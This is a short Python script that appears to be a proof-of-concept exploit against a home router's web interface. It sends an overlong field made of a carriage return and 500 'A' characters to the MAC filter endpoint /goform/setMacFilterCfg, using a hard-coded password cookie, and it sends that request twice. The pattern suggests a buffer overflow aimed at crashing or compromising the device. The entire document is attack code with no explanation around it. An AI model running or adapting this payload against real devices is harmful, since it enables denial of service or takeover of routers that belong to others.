import requests
 
url = "http://192.168.10.1/goform/setMacFilterCfg"
cookie = {"Cookie":"password=12345"}
data = {"macFilterType": "white", "deviceList": "\r"+ "A"*500}
response = requests.post(url, cookies=cookie, data=data)
response = requests.post(url, cookies=cookie, data=data)
print(response.text)


